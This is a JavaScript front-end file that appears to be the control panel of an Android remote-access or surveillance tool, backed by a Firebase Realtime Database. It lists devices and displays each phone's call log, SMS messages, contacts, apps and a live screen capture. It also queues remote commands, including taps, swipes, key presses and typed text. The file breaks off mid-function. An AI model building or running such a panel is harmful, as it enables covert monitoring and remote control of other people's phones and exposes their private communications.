import {
  ref,
  onValue,
  set,
  update,
  push,
  remove,
} from 'firebase/database';
import {
  getRtdb,
  OperationType,
  handleRtdbError,
} from './firebase.js';

function formatNowLabel() {
  return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

const MAX_COMMAND_QUEUE = 5;

// --- Application State ---
const state = {
  loadingDevices: true,
  rtdbError: '',
  devices: [],
  uidBasePath: '',
  activeUid: '',
  rawUidNode: null,
  status: null,
  calllog: [],
  messages: [],
  contacts: [],
  apps: [],
  commands: [],
  screenData: null,
  screenControl: null,
  screenControlMode: 'tap', // tap | swipe
  screenSizeMode: 'normal', // mini | normal | max
  castStep: 'idle', // idle | allowed | started | stopped
  lastTapMarker: null,
  swipeTrail: null,
  markerClearTimer: null,
  frameSwapToken: 0,
  frameSwapTimer: null,
  lastCommittedFrameSrc: '',
  latestPendingFrameSrc: '',
  screen: 'home', // lock | home | phone | messages | contacts | apps | commands | screen | settings
  screenHistory: [],
  locked: false,
  shadeOpen: false,
  phoneTab: 'all', // all | missed | dialer
  dialNumber: '',
  activeThreadPhone: null,
  showNewMessageForm: false,
  contactSearch: '',
  showAddContactForm: false,
  expandedContactId: null,
  appSearch: '',
  appCategory: 'All',
  showInstallAppForm: false,
  inspectorTab: 'status',
  rootUnsub: null,
  deviceUnsub: null,
  trimmingCommands: false,
  toastTimer: null,
};

// --- Utilities ---
function esc(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function cleanText(value, maxLen) {
  return String(value ?? '').trim().slice(0, maxLen);
}

function formatDuration(sec) {
  const n = Math.max(0, Number(sec) || 0);
  if (n === 0) return '0s';
  const m = Math.floor(n / 60);
  const s = n % 60;
  return m > 0 ? `${m}m ${String(s).padStart(2, '0')}s` : `${s}s`;
}

function showErrorBanner(message) {
  const banner = document.getElementById('global-error-banner');
  const textEl = document.getElementById('global-error-text');
  if (!banner || !textEl) return;
  textEl.textContent = message;
  banner.classList.remove('hidden');
}

function hideErrorBanner() {
  const banner = document.getElementById('global-error-banner');
  if (banner) banner.classList.add('hidden');
}

function showPhoneToast(title, subtitle) {
  const toastEl = document.getElementById('phone-toast');
  if (!toastEl) return;
  toastEl.innerHTML = `
    <div class="flex items-start justify-between gap-2">
      <div class="min-w-0">
        <p class="font-semibold text-white truncate">${esc(title)}</p>
        <p class="text-slate-300 mt-0.5 truncate">${esc(subtitle)}</p>
      </div>
      <span class="text-[10px] font-mono-tabular text-slate-400 shrink-0">${esc(formatNowLabel())}</span>
    </div>
  `;
  toastEl.classList.remove('hidden');
  if (state.toastTimer) clearTimeout(state.toastTimer);
  state.toastTimer = setTimeout(() => {
    toastEl.classList.add('hidden');
  }, 3200);
}

// Normalize RTDB map or array into [{ id, ... }]
function entriesFromRtdb(node) {
  if (!node || typeof node !== 'object') return [];
  if (Array.isArray(node)) {
    return node
      .map((item, idx) => (item && typeof item === 'object' ? { id: String(idx), ...item } : null))
      .filter(Boolean);
  }
  return Object.entries(node)
    .filter(([, val]) => val && typeof val === 'object')
    .map(([key, val]) => ({ id: key, ...val }));
}

function parseBatteryNumber(val) {
  if (typeof val === 'number' && !Number.isNaN(val)) return Math.max(0, Math.min(100, val));
  if (typeof val === 'string') {
    const num = parseFloat(val.replace('%', '').trim());
    if (!Number.isNaN(num)) return Math.max(0, Math.min(100, num));
  }
  return 0;
}

function devicePath(uid, subPath = '') {
  const base = state.uidBasePath ? `${state.uidBasePath}/${uid}` : uid;
  return subPath ? `${base}/${subPath}` : base;
}

function normalizeStatusNode(uid, uidNode) {
  const raw = uidNode?.status || uidNode || {};
  return {
    deviceName: raw.deviceName || raw.device_name || raw.name || raw.model || raw.deviceUid || uid,
    model: raw.model || uidNode?.model || 'Android Device',
    osVersion: raw.osVersion || raw.os || raw.androidVersion || 'Android 15',
    batteryLevel: parseBatteryNumber(raw.batteryLevel ?? raw.battery ?? raw.batry ?? raw.level ?? 84),
    isCharging: Boolean(raw.isCharging ?? raw.charging ?? false),
    online: raw.online !== undefined ? Boolean(raw.online) : true,
    lastSeen: raw.lastSeen || raw.updatedAt || null,
    networkType: raw.networkType || raw.network || '5G',
    signalStrength: typeof raw.signalStrength === 'number' ? raw.signalStrength : 4,
    wifiConnected: raw.wifiConnected !== undefined ? Boolean(raw.wifiConnected) : Boolean(raw.wifi ?? true),
    wifiName: raw.wifiName || raw.ssid || 'Wi-Fi',
    bluetoothOn: Boolean(raw.bluetoothOn ?? raw.bluetooth ?? false),
    storageUsedGb: Number(raw.storageUsedGb ?? 46.8),
    storageTotalGb: Number(raw.storageTotalGb ?? 128),
    ramUsedGb: Number(raw.ramUsedGb ?? 4.9),
    ramTotalGb: Number(raw.ramTotalGb ?? 12),
    temperatureC: Number(raw.temperatureC ?? raw.temp ?? 31.4),
    updatedAt: raw.updatedAt || raw.lastSeen || Date.now(),
  };
}

function normalizeCallLog(uidNode) {
  const rawNode = uidNode?.calllog || uidNode?.callLog || uidNode?.calls;
  return entriesFromRtdb(rawNode)
    .map((c) => ({
      id: c.id,
      name: c.name || c.contactName || c.phoneNumber || c.number || c.phone || 'Unknown',
      phoneNumber: c.phoneNumber || c.number || c.phone || 'Unknown',
      type: String(c.type || c.callType || 'incoming').toLowerCase(),
      durationSec: Number(c.durationSec ?? c.duration ?? 0),
      timestampLabel: c.timestampLabel || c.time || c.date || 'Recent',
      createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
    }))
    .sort((a, b) => b.createdAt - a.createdAt);
}

function normalizeMessages(uidNode) {
  const rawNode = uidNode?.messages || uidNode?.msg || uidNode?.MSG || uidNode?.sms;
  return entriesFromRtdb(rawNode)
    .map((m) => ({
      id: m.id,
      senderName: m.senderName || m.sender || m.name || m.phoneNumber || m.number || 'Unknown',
      phoneNumber: m.phoneNumber || m.number || m.phone || m.address || m.sender || 'Unknown',
      body: m.body || m.message || m.msg || m.text || '',
      direction: m.direction === 'outbound' || m.type === 'sent' ? 'outbound' : 'inbound',
      unread: Boolean(m.unread ?? false),
      timestampLabel: m.timestampLabel || m.time || m.date || 'Recent',
      createdAt: Number(m.createdAt ?? m.timestamp ?? 0),
    }))
    .sort((a, b) => b.createdAt - a.createdAt);
}

function normalizeContacts(uidNode) {
  const rawNode = uidNode?.contacts || uidNode?.contact;
  return entriesFromRtdb(rawNode)
    .map((c) => ({
      id: c.id,
      name: c.name || c.displayName || 'Unnamed',
      phoneNumber: c.phoneNumber || c.number || c.phone || '',
      email: c.email || '',
      company: c.company || '',
      favorite: Boolean(c.favorite ?? false),
    }))
    .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
}

function normalizeApps(uidNode) {
  const rawNode = uidNode?.apps || uidNode?.applist || uidNode?.appList;
  return entriesFromRtdb(rawNode)
    .map((a) => ({
      id: a.id,
      name: a.name || a.appName || a.label || a.packageName || 'App',
      packageName: a.packageName || a.package || a.pkg || 'com.android.app',
      version: a.version || a.versionName || '1.0',
      sizeMb: Number(a.sizeMb ?? a.size ?? 24),
      category: a.category || 'Utilities',
      systemApp: Boolean(a.systemApp ?? false),
      enabled: a.enabled !== undefined ? Boolean(a.enabled) : true,
    }))
    .filter((a) => {
      const idLower = (a.id || '').toLowerCase();
      const nameLower = (a.name || '').toLowerCase();
      const pkgLower = (a.packageName || '').toLowerCase();
      const isFiles =
        idLower === 'app_files' ||
        pkgLower.includes('files') ||
        nameLower.includes('file manager');
      const isNotes =
        idLower === 'app_notes' ||
        pkgLower.includes('notes') ||
        nameLower.includes('notes');
      const isCamera =
        idLower === 'app_camera' ||
        pkgLower.includes('camera') ||
        nameLower.includes('camera lab');
      return !isFiles && !isNotes && !isCamera;
    })
    .sort((a, b) => (a.name || '').localeCompare(b.name || ''));
}

function getSortedCommandIds(rawNode) {
  return entriesFromRtdb(rawNode)
    .map((c) => ({
      id: c.id,
      createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
    }))
    .sort((a, b) => (b.createdAt - a.createdAt) || String(b.id).localeCompare(String(a.id)));
}

function normalizeCommands(uidNode) {
  const rawNode = uidNode?.commands || uidNode?.command || uidNode?.cmd;
  return entriesFromRtdb(rawNode)
    .map((c) => ({
      id: c.id,
      command: c.command || c.action || c.name || c.type || 'SYNC',
      target: c.target || c.list || c.node || 'all',
      payload: c.payload ?? c.data ?? '',
      status: String(c.status || 'pending').toLowerCase(),
      timestampLabel: c.timestampLabel || c.time || 'Recent',
      createdAt: Number(c.createdAt ?? c.timestamp ?? 0),
    }))
    .sort((a, b) => (b.createdAt - a.createdAt) || String(b.id).localeCompare(String(a.id)))
    .slice(0, MAX_COMMAND_QUEUE);
}

function detectBase64Mime(b64, fallback = 'image/jpeg') {
  if (!b64) return fallback;
  if (b64.startsWith('iVBOR')) return 'image/png';
  if (b64.startsWith('/9j/')) return 'image/jpeg';
  if (b64.startsWith('UklGR')) return 'image/webp';
  if (b64.startsWith('R0lGOD')) return 'image/gif';
  return fallback;
}

function buildBase64ImageSrc(rawVal, mimeHint = 'image/jpeg') {
  if (typeof rawVal !== 'string') return '';
  const trimmed = rawVal.trim();
  if (!trimmed) return '';
  if (trimmed.startsWith('data:image/') || trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
    return trimmed;
  }
  const cleanB64 = trimmed.replace(/\s+/g, '');
  if (cleanB64.length < 16) return '';
  const mime = detectBase64Mime(cleanB64, mimeHint);
  return `data:${mime};base64,${cleanB64}`;
}

function normalizeScreenNode(uidNode) {
  const raw =
    uidNode?.screen ??
    uidNode?.screenshot ??
    uidNode?.screenShot ??
    uidNode?.liveScreen ??
    uidNode?.display ??
    uidNode?.status?.screenBase64 ??
    uidNode?.status?.screen;
  if (!raw) return null;
  if (typeof raw === 'string') {
    const src = buildBase64ImageSrc(raw);
    if (!src) return null;
    return {
      imageSrc: src,
      rawLength: raw.length,
      width: Number(uidNode?.status?.screenWidth ?? 1080),
      height: Number(uidNode?.status?.screenHeight ?? 2400),
      streaming: false,
      updatedAt: uidNode?.status?.updatedAt || null,
    };
  }
  if (typeof raw === 'object') {
    const b64 = raw.base64 ?? raw.image ?? raw.frame ?? raw.data ?? raw.url ?? raw.screenshot ?? raw.screenBase64 ?? '';
    const src = buildBase64ImageSrc(String(b64), raw.mimeType || raw.mime || 'image/jpeg');
    return {
      imageSrc: src,
      rawLength: typeof b64 === 'string' ? b64.length : 0,
      width: Math.max(100, Number(raw.width ?? raw.screenWidth ?? 1080)),
      height: Math.max(100, Number(raw.height ?? raw.screenHeight ?? 2400)),
      streaming: Boolean(raw.streaming ?? false),
      updatedAt: raw.updatedAt || raw.timestamp || null,
    };
  }
  return null;
}

function normalizeScreenControlNode(uidNode) {
  const raw = uidNode?.screenControl || uidNode?.screen_control || uidNode?.control;
  if (!raw || typeof raw !== 'object') return null;
  return raw;
}

function resolveCollectionKey(uidNode, candidates, fallback) {
  if (uidNode && typeof uidNode === 'object') {
    for (const k of candidates) {
      if (uidNode[k] !== undefined) return k;
    }
  }
  return fallback;
}

// --- Live Clock ---
function updateClocks() {
  const now = new Date();
  const shortTime = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });
  const clockEl = document.getElementById('sb-clock');
  if (clockEl) clockEl.textContent = shortTime;

  const lockClock = document.getElementById('lock-clock-display');
  if (lockClock) lockClock.textContent = shortTime;
}
setInterval(updateClocks, 15000);

// --- Realtime Database Subscription Lifecycle ---
function clearRootListener() {
  if (state.rootUnsub) {
    try {
      state.rootUnsub();
    } catch {
      // Ignore
    }
    state.rootUnsub = null;
  }
}

function clearDeviceListener() {
  if (state.deviceUnsub) {
    try {
      state.deviceUnsub();
    } catch {
      // Ignore
    }
    state.deviceUnsub = null;
  }
}

function returnToUidList() {
  clearDeviceListener();
  state.activeUid = '';
  state.rawUidNode = null;
  state.status = null;
  state.calllog = [];
  state.messages = [];
  state.contacts = [];
  state.apps = [];
  state.commands = [];
  state.screenData = null;
  state.screenControl = null;
  state.lastTapMarker = null;
  state.swipeTrail = null;
  if (state.frameSwapTimer) {
    clearTimeout(state.frameSwapTimer);
    state.frameSwapTimer = null;
  }
  state.frameSwapToken += 1;
  state.lastCommittedFrameSrc = '';
  state.latestPendingFrameSrc = '';
  state.shadeOpen = false;
  state.locked = false;
  state.screen = 'home';
  document.getElementById('rtdb-inspector-modal')?.classList.add('hidden');
  renderAll();
}

function bootRtdbDirectory() {
  clearRootListener();
  clearDeviceListener();
  state.loadingDevices = true;
  state.rtdbError = '';
  renderAll();

  const rtdb = getRtdb();
  const rootRef = ref(rtdb, '/');

  state.rootUnsub = onValue(
    rootRef,
    (snapshot) => {
      state.loadingDevices = false;
      state.rtdbError = '';
      const val = snapshot.val();
      if (!val || typeof val !== 'object') {
        state.uidBasePath = '';
        state.devices = [];
      } else {
        const hasDevicesWrapper =
          val.devices &&
          typeof val.devices === 'object' &&
          !val.devices.status &&
          !val.devices.calllog &&
          !val.devices.messages;
        state.uidBasePath = hasDevicesWrapper ? 'devices' : '';
        const sourceMap = hasDevicesWrapper ? val.devices : val;
        state.devices = Object.entries(sourceMap)
          .filter(([, node]) => node && typeof node === 'object')
          .map(([uid, node]) => {
            const st = normalizeStatusNode(uid, node);
            return {
              id: uid,
              deviceName: st.deviceName,
              model: st.model,
              osVersion: st.osVersion,
              batteryLevel: st.batteryLevel,
              isCharging: st.isCharging,
              online: st.online,
            };
          })
          .sort((a, b) => a.id.localeCompare(b.id));
      }
      renderAll();
    },
    (error) => {
      state.loadingDevices = false;
      state.rtdbError = error.message || 'Realtime Database read failed.';
      handleRtdbError(error, OperationType.LIST, '/');
      showErrorBanner(state.rtdbError);
      renderAll();
    }
  );
}

function selectDeviceUid(deviceUid) {
  if (!deviceUid) return;
  clearDeviceListener();

  state.activeUid = deviceUid;
  state.rawUidNode = null;
  state.status = null;
  state.calllog = [];
  state.messages = [];
  state.contacts = [];
  state.apps = [];
  state.commands = [];
  state.screenData = null;
  state.screenControl = null;
  state.screenSizeMode = 'normal';
  state.castStep = 'idle';
  state.lastTapMarker = null;
  state.swipeTrail = null;
  if (state.frameSwapTimer) {
    clearTimeout(state.frameSwapTimer);
    state.frameSwapTimer = null;
  }
  state.frameSwapToken += 1;
  state.lastCommittedFrameSrc = '';
  state.latestPendingFrameSrc = '';
  state.activeThreadPhone = null;
  state.expandedContactId = null;
  state.locked = false;
  state.screen = 'home';
  state.screenHistory = [];
  renderAll();

  const rtdb = getRtdb();
  const targetPath = devicePath(deviceUid);
  state.deviceUnsub = onValue(
    ref(rtdb, targetPath),
    (snapshot) => {
      const node = snapshot.val();
      state.rawUidNode = node;
      if (node && typeof node === 'object') {
        state.status = normalizeStatusNode(deviceUid, node);
        state.calllog = normalizeCallLog(node);
        state.messages = normalizeMessages(node);
        state.contacts = normalizeContacts(node);
        state.apps = normalizeApps(node);
        state.commands = normalizeCommands(node);
        state.screenData = normalizeScreenNode(node);
        state.screenControl = normalizeScreenControlNode(node);
        void trimExcessCommandsOnServer(deviceUid, node);
      } else {
        state.status = null;
        state.calllog = [];
        state.messages = [];
        state.contacts = [];
        state.apps = [];
        state.commands = [];
        state.screenData = null;
        state.screenControl = null;
      }
      renderAll();
    },
    (error) => {
      handleRtdbError(error, OperationType.GET, `/${targetPath}`);
      showErrorBanner(error.message || `Error listening to /${targetPath}`);
    }
  );
}

// --- RTDB Mutation Helpers ---
async function updateDeviceStatusFields(fields) {
  if (!state.activeUid || !state.status) return;
  const rtdb = getRtdb();
  const path = devicePath(state.activeUid, 'status');
  const rawStatus = state.rawUidNode?.status || {};
  const mappedFields = { ...fields };
  if ('batteryLevel' in mappedFields && rawStatus.battery !== undefined && rawStatus.batteryLevel === undefined) {
    mappedFields.battery = mappedFields.batteryLevel;
    delete mappedFields.batteryLevel;
  }
  if ('isCharging' in mappedFields && rawStatus.charging !== undefined && rawStatus.isCharging === undefined) {
    mappedFields.charging = mappedFields.isCharging;
    delete mappedFields.isCharging;
  }
  try {
    const patch = {
      ...mappedFields,
      updatedAt: Date.now(),
    };
    if (rawStatus.lastSeen !== undefined && !('lastSeen' in patch)) {
      patch.lastSeen = Date.now();
    }
    await update(ref(rtdb, path), patch);
  } catch (err) {
    handleRtdbError(err, OperationType.UPDATE, path);
    showErrorBanner(err.message);
  }
}

async function saveDeviceName(newName) {
  const safeName = cleanText(newName, 64);
  if (!safeName || !state.activeUid) return;
  await updateDeviceStatusFields({ deviceName: safeName });
  showPhoneToast('Device Renamed', safeName);
}

async function logCallEntry({ name, phoneNumber, type, durationSec }) {
  if (!state.activeUid) return;
  const safeNumber = cleanText(phoneNumber, 32);
  if (!safeNumber) return;
  const matchedContact = state.contacts.find((c) => c.phoneNumber === safeNumber);
  const safeName = cleanText(name || matchedContact?.name || safeNumber, 80);
  const safeType = ['incoming', 'outgoing', 'missed'].includes(type) ? type : 'outgoing';
  const safeDuration = Math.max(0, Math.min(86400, Math.round(Number(durationSec) || 0)));
  const callKey = resolveCollectionKey(state.rawUidNode, ['calllog', 'callLog', 'calls'], 'calllog');
  const path = devicePath(state.activeUid, callKey);
  try {
    await push(ref(getRtdb(), path), {
      name: safeName,
      phoneNumber: safeNumber,
      type: safeType,
      durationSec: safeDuration,
      timestampLabel: `Today, ${formatNowLabel()}`,
      createdAt: Date.now(),
    });
  } catch (err) {
    handleRtdbError(err, OperationType.CREATE, path);
    showErrorBanner(err.message);
  }
}

async function deleteCallEntry(callId) {
  if (!state.activeUid || !callId) return;
  const callKey = resolveCollectionKey(state.rawUidNode, ['calllog', 'callLog', 'calls'], 'calllog');
  const path = devicePath(state.activeUid, `${callKey}/${callId}`);
  try {
    await remove(ref(getRtdb(), path));
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, path);
    showErrorBanner(err.message);
  }
}

async function sendSmsMessage({ senderName, phoneNumber, body, direction = 'outbound' }) {
  if (!state.activeUid) return;
  const safeNumber = cleanText(phoneNumber, 32);
  const safeBody = cleanText(body, 1000);
  if (!safeNumber || !safeBody) return;
  const matchedContact = state.contacts.find((c) => c.phoneNumber === safeNumber);
  const safeName = cleanText(senderName || matchedContact?.name || safeNumber, 80);
  const safeDir = direction === 'inbound' ? 'inbound' : 'outbound';
  const msgKey = resolveCollectionKey(state.rawUidNode, ['messages', 'msg', 'MSG', 'sms'], 'messages');
  const path = devicePath(state.activeUid, msgKey);
  try {
    await push(ref(getRtdb(), path), {
      senderName: safeName,
      phoneNumber: safeNumber,
      body: safeBody,
      direction: safeDir,
      unread: safeDir === 'inbound',
      timestampLabel: formatNowLabel(),
      createdAt: Date.now(),
    });
  } catch (err) {
    handleRtdbError(err, OperationType.CREATE, path);
    showErrorBanner(err.message);
  }
}

async function markThreadRead(phoneNumber) {
  if (!state.activeUid || !phoneNumber) return;
  const msgKey = resolveCollectionKey(state.rawUidNode, ['messages', 'msg', 'MSG', 'sms'], 'messages');
  const unreadDocs = state.messages.filter((m) => m.phoneNumber === phoneNumber && m.unread === true);
  const rtdb = getRtdb();
  for (const m of unreadDocs) {
    const msgPath = devicePath(state.activeUid, `${msgKey}/${m.id}`);
    try {
      await update(ref(rtdb, msgPath), { unread: false });
    } catch (err) {
      handleRtdbError(err, OperationType.UPDATE, msgPath);
    }
  }
}

async function addContactEntry({ name, phoneNumber, email, company }) {
  if (!state.activeUid) return;
  const safeName = cleanText(name, 80);
  const safePhone = cleanText(phoneNumber, 32);
  if (!safeName || !safePhone) return;
  const contactKey = resolveCollectionKey(state.rawUidNode, ['contacts', 'contact'], 'contacts');
  const path = devicePath(state.activeUid, contactKey);
  try {
    await push(ref(getRtdb(), path), {
      name: safeName,
      phoneNumber: safePhone,
      email: cleanText(email, 120),
      company: cleanText(company, 80),
      favorite: false,
    });
    showPhoneToast('Contact Saved', safeName);
  } catch (err) {
    handleRtdbError(err, OperationType.CREATE, path);
    showErrorBanner(err.message);
  }
}

async function toggleContactFavorite(contact) {
  if (!state.activeUid || !contact) return;
  const contactKey = resolveCollectionKey(state.rawUidNode, ['contacts', 'contact'], 'contacts');
  const path = devicePath(state.activeUid, `${contactKey}/${contact.id}`);
  try {
    await update(ref(getRtdb(), path), { favorite: !contact.favorite });
  } catch (err) {
    handleRtdbError(err, OperationType.UPDATE, path);
    showErrorBanner(err.message);
  }
}

async function deleteContactEntry(contactId) {
  if (!state.activeUid || !contactId) return;
  const contactKey = resolveCollectionKey(state.rawUidNode, ['contacts', 'contact'], 'contacts');
  const path = devicePath(state.activeUid, `${contactKey}/${contactId}`);
  try {
    await remove(ref(getRtdb(), path));
    if (state.expandedContactId === contactId) state.expandedContactId = null;
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, path);
    showErrorBanner(err.message);
  }
}

async function installAppEntry({ name, packageName, version, sizeMb, category }) {
  if (!state.activeUid) return;
  const safeName = cleanText(name, 64);
  const safePkg = cleanText(packageName, 128);
  if (!safeName || safePkg.length < 3) return;
  const validCats = ['System', 'Communication', 'Utilities', 'Media', 'Productivity'];
  const safeCat = validCats.includes(category) ? category : 'Utilities';
  const appsKey = resolveCollectionKey(state.rawUidNode, ['apps', 'applist', 'appList'], 'apps');
  const path = devicePath(state.activeUid, appsKey);
  try {
    await push(ref(getRtdb(), path), {
      name: safeName,
      packageName: safePkg,
      version: cleanText(version || '1.0.0', 24),
      sizeMb: Math.max(1, Math.min(50000, Math.round(Number(sizeMb) || 32))),
      category: safeCat,
      systemApp: false,
      enabled: true,
    });
    showPhoneToast('App Installed', `${safeName} (${safeCat})`);
  } catch (err) {
    handleRtdbError(err, OperationType.CREATE, path);
    showErrorBanner(err.message);
  }
}

async function toggleAppEnabled(appItem) {
  if (!state.activeUid || !appItem) return;
  const appsKey = resolveCollectionKey(state.rawUidNode, ['apps', 'applist', 'appList'], 'apps');
  const path = devicePath(state.activeUid, `${appsKey}/${appItem.id}`);
  try {
    await update(ref(getRtdb(), path), { enabled: !appItem.enabled });
  } catch (err) {
    handleRtdbError(err, OperationType.UPDATE, path);
    showErrorBanner(err.message);
  }
}

async function uninstallAppEntry(appItem) {
  if (!state.activeUid || !appItem || appItem.systemApp) return;
  const appsKey = resolveCollectionKey(state.rawUidNode, ['apps', 'applist', 'appList'], 'apps');
  const path = devicePath(state.activeUid, `${appsKey}/${appItem.id}`);
  try {
    await remove(ref(getRtdb(), path));
    showPhoneToast('App Uninstalled', appItem.name);
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, path);
    showErrorBanner(err.message);
  }
}

async function trimExcessCommandsOnServer(uid, uidNode) {
  if (!uid || !uidNode || state.trimmingCommands) return;
  const cmdKey = resolveCollectionKey(uidNode, ['commands', 'command', 'cmd'], 'commands');
  const rawNode = uidNode?.[cmdKey];
  const sorted = getSortedCommandIds(rawNode);
  if (sorted.length <= MAX_COMMAND_QUEUE) return;

  const stale = sorted.slice(MAX_COMMAND_QUEUE);
  const pruneMap = {};
  for (const item of stale) {
    pruneMap[item.id] = null;
  }
  const cmdPath = devicePath(uid, cmdKey);
  state.trimmingCommands = true;
  try {
    await update(ref(getRtdb(), cmdPath), pruneMap);
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, cmdPath);
  } finally {
    state.trimmingCommands = false;
  }
}

async function pushCommandCapped(cmdKey, cmdPath, commandPayload, maxKeep = MAX_COMMAND_QUEUE) {
  const rtdb = getRtdb();
  const listRef = ref(rtdb, cmdPath);
  const newKey = push(listRef).key;
  if (!newKey) return;

  const updatesObj = {
    [newKey]: commandPayload,
  };
  const existingSorted = getSortedCommandIds(state.rawUidNode?.[cmdKey]);
  const staleEntries = existingSorted.slice(Math.max(0, maxKeep - 1));
  for (const entry of staleEntries) {
    updatesObj[entry.id] = null;
  }

  await update(listRef, updatesObj);
}

async function sendDeviceCommand({ command, target = 'all', payload = '' }) {
  if (!state.activeUid) return;
  const safeCommand = cleanText(command, 64).toUpperCase().replace(/\s+/g, '_');
  if (!safeCommand) return;
  const safeTarget = cleanText(target || 'all', 32).toLowerCase();
  const safePayload = cleanText(payload, 500);
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const path = devicePath(state.activeUid, cmdKey);
  try {
    await pushCommandCapped(cmdKey, path, {
      command: safeCommand,
      target: safeTarget,
      payload: safePayload,
      status: 'pending',
      timestampLabel: formatNowLabel(),
      createdAt: Date.now(),
    });
    showPhoneToast('Command Sent', `${safeCommand} → /${path}`);
  } catch (err) {
    handleRtdbError(err, OperationType.CREATE, path);
    showErrorBanner(err.message);
  }
}

async function updateCommandStatus(commandId, nextStatus) {
  if (!state.activeUid || !commandId) return;
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const path = devicePath(state.activeUid, `${cmdKey}/${commandId}`);
  const safeStatus = ['pending', 'executed', 'failed'].includes(nextStatus) ? nextStatus : 'executed';
  try {
    await update(ref(getRtdb(), path), {
      status: safeStatus,
      updatedAt: Date.now(),
    });
  } catch (err) {
    handleRtdbError(err, OperationType.UPDATE, path);
    showErrorBanner(err.message);
  }
}

async function deleteCommandEntry(commandId) {
  if (!state.activeUid || !commandId) return;
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const path = devicePath(state.activeUid, `${cmdKey}/${commandId}`);
  try {
    await remove(ref(getRtdb(), path));
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, path);
    showErrorBanner(err.message);
  }
}

async function clearAllCommands() {
  if (!state.activeUid) return;
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const path = devicePath(state.activeUid, cmdKey);
  try {
    await remove(ref(getRtdb(), path));
    showPhoneToast('Command Queue Cleared', `/${path}`);
  } catch (err) {
    handleRtdbError(err, OperationType.DELETE, path);
    showErrorBanner(err.message);
  }
}

async function sendScreenTapControl({
  action = 'tap',
  x = 0,
  y = 0,
  xPercent = 0,
  yPercent = 0,
  startX = 0,
  startY = 0,
  endX = 0,
  endY = 0,
  startXPercent = 0,
  startYPercent = 0,
  endXPercent = 0,
  endYPercent = 0,
  durationMs = 220,
  width = 1080,
  height = 2400,
  key = '',
  text = '',
}) {
  if (!state.activeUid) return;
  const rtdb = getRtdb();
  const controlKey = resolveCollectionKey(state.rawUidNode, ['screenControl', 'screen_control', 'control'], 'screenControl');
  const controlPath = devicePath(state.activeUid, controlKey);
  const cmdKey = resolveCollectionKey(state.rawUidNode, ['commands', 'command', 'cmd'], 'commands');
  const cmdPath = devicePath(state.activeUid, cmdKey);
  const now = Date.now();
  const safeDurationMs = Math.max(100, Math.min(600, Math.round(Number(durationMs) || 220)));
  const safeText = cleanText(text, 500);
  if (action === 'text' && !safeText) return;

  const controlPayload =
    action === 'swipe'
      ? {
          action: 'SWIPE',
          startX: Math.round(startX),
          startY: Math.round(startY),
          endX: Math.round(endX),
          endY: Math.round(endY),
          durationMs: safeDurationMs,
          width: Math.round(width),
          height: Math.round(height),
          status: 'pending',
          timestamp: now,
        }
      : action === 'key'
        ? {
            action: 'KEY',
            key: cleanText(key, 32).toUpperCase(),
            status: 'pending',
            timestamp: now,
          }
        : action === 'text'
          ? {
              action: 'TEXT',
              text: safeText,
              status: 'pending',
              timestamp: now,
            }
          : {
              action: 'TAP',
              x: Math.round(x),
              y: Math.round(y),
              xPercent: Number(Number(xPercent).toFixed(4)),
              yPercent: Number(Number(yPercent).toFixed(4)),
              width: Math.round(width),
              height: Math.round(height),
              status: 'pending',
              timestamp: now,
            };

  const commandName =
    action === 'swipe'
      ? 'SWIPE'
      : action === 'key'
        ? `KEY_${cleanText(key, 32).toUpperCase()}`
        : action === 'text'
          ? 'INPUT_TEXT'
          : 'TAP';

  if (action === 'tap') {
    state.swipeTrail = null;
    state.lastTapMarker = {
      x: controlPayload.x,
      y: controlPayload.y,
      xPercent: controlPayload.xPercent,
      yPercent: controlPayload.yPercent,
      pressed: false,
      at: now,
    };
    renderTapDotLayer(state.lastTapMarker);
    scheduleClearScreenOverlay(210);
    showPhoneToast(
      'Tap Sent',
      `(${controlPayload.x}, ${controlPayload.y}) · ${Math.round(controlPayload.xPercent * 100)}%, ${Math.round(controlPayload.yPercent * 100)}%`
    );
  } else if (action === 'swipe') {
    state.lastTapMarker = null;
    state.swipeTrail = {
      startXPercent: Number(Number(startXPercent).toFixed(4)),
      startYPercent: Number(Number(startYPercent).toFixed(4)),
      endXPercent: Number(Number(endXPercent).toFixed(4)),
      endYPercent: Number(Number(endYPercent).toFixed(4)),
      startX: controlPayload.startX,
      startY: controlPayload.startY,
      endX: controlPayload.endX,
      endY: controlPayload.endY,
      active: false,
      at: now,
    };
    renderSwipeTrailLayer(state.swipeTrail);
    scheduleClearScreenOverlay(210);
    showPhoneToast(
      'Swipe Sent',
      `(${controlPayload.startX},${controlPayload.startY}) → (${controlPayload.endX},${controlPayload.endY})`
    );
  } else if (action === 'text') {
    const readout = document.getElementById('remote-screen-coord-readout');
    if (readout) {
      readout.textContent = `TEXT: "${safeText.slice(0, 24)}${safeText.length > 24 ? '…' : ''}"`;
    }
    showPhoneToast('Screen Msg Sent', safeText);
  } else {
    showPhoneToast('Screen Key Sent', commandName);
  }

  try {
    await Promise.all([
      set(ref(rtdb, controlPath), controlPayload),
      pushCommandCapped(cmdKey, cmdPath, {
        command: commandName,
        target: 'screen',
        ...controlPayload,
        payload: JSON.stringify(controlPayload),
        timestampLabel: formatNowLabel(),
        createdAt: now,
      }),
    ]);
  } catch (err) {
    handleRtdbError(err, OperationType.WRITE, controlPath);
    showErrorBanner(err.message);
  }
}

function getEffectiveCastState() {
  const streaming = Boolean(state.screenData?.streaming);
  const ctrlAction = String(state.screenControl?.action || '').toUpperCase();
  const allowed =
